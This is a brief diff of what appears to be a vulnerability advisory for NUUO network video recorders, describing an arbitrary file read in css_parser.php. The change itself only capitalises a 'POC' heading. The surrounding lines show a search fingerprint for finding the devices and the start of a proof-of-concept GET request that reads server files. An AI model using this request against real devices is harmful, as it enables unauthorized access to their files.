@@ -8,7 +8,7 @@ NUUO网络视频录像机 css_parser.php 存在任意文件读取漏洞，未经
 body="www.nuuo.com/eHelpdesk.php"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /css_parser.php?css=css_parser.php HTTP/1.1
